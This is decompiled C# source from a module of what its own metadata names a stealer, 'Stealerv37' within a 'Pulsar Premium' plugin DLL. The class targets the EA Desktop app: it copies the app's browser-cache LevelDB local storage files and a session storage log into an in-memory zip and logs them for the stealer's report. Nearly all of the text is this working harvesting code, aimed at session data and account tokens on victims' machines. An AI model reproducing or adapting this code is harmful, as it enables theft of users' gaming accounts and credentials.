// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Games.ElectronicArts
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using System;
using System.IO;

#nullable disable
namespace Intelix.Targets.Games;

public class ElectronicArts : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string path1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Electronic Arts", "EA Desktop", "CEF");
    if (!Directory.Exists(path1))
      return;
    Counter.CounterApplications counterApplications = new Counter.CounterApplications();
    counterApplications.Name = "Electronic Arts";
    int num = 0;
    string path2 = Path.Combine(path1, "BrowserCache", "EADesktop", "Local Storage", "leveldb");
    if (Directory.Exists(path2))
    {
      foreach (string file in Directory.GetFiles(path2))
      {
        try
        {
          if (string.Equals(Path.GetExtension(file), ".ldb", StringComparison.OrdinalIgnoreCase))
          {
            string entryPath = "Electronic Arts\\leveldb\\" + Path.GetFileName(file);
            zip.AddFile(entryPath, File.ReadAllBytes(file));
            counterApplications.Files.Add($"{file} => {entryPath}");
            ++num;
          }
        }
        catch
        {
        }
      }
    }
    string path3 = Path.Combine(path1, "BrowserCache", "EADesktop", "Session Storage", "000003.log");
    if (File.Exists(path3))
    {
      try
      {
        string entryPath = "Electronic Arts\\Session Storage\\000003.log";
        zip.AddFile(entryPath, File.ReadAllBytes(path3));
        counterApplications.Files.Add($"{path3} => {entryPath}");
        ++num;
      }
      catch
      {
      }
    }
    if (num == 0)
      return;
    counterApplications.Files.Add("Electronic Arts\\");
    counter.Games.Add(counterApplications);
  }
}
